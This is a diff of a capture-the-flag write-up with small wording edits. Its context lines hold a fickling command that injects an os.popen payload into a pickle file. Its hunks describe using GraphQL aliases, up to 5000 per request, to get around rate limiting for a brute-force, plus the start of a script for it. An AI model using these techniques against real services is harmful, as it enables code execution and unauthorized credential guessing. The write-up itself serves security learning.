@@ -213,7 +213,7 @@ fickling --inject "int(__import__('os').popen('cat flag.txt').read())" portfolio
 
 ![image](https://github.com/user-attachments/assets/feea68ae-be24-4d6f-a860-bea77a1c54a2)
 
-- The easier method will be to brute force but we might hit a rate limiting error.I checked the js file and discovered that it runs on graphql.
+- The easier method would have been bruteforcing but we might hit a rate limiting error.I checked the js file and discovered that it runs on graphql.
 
 ```js
 // GraphQL query
@@ -237,6 +237,8 @@ fickling --inject "int(__import__('os').popen('cat flag.txt').read())" portfolio
 ```
 
 - We can bypass rate limiting in graphql by using aliases.A `Query` is made to the server to get data.You can view it as either a `POST` or `GET` request to grab data.An `Alias` allows you to create multiple queries in a single request e.g if you are trying to bruteforce, you can send in multiple values in a single request e.g
+
+-> Query -:
 
  ```graphql
 query {
@@ -265,7 +267,7 @@ query {
 }
 ```
 
-- After testing it, I noticed that the server can handle only `5000` aliases.I tried `10000` aliases at first and 502 gateway error.I wrote a script to make it easier because I can't manually create 5000 aliases.
+- After testing it, I noticed that the server can handle only `5000` aliases per request.I tried `10000` aliases at first and 502 gateway error.I wrote a script to make it easier because I can't manually create 5000 aliases.
 
 ```python3
 #! /usr/bin/env python3
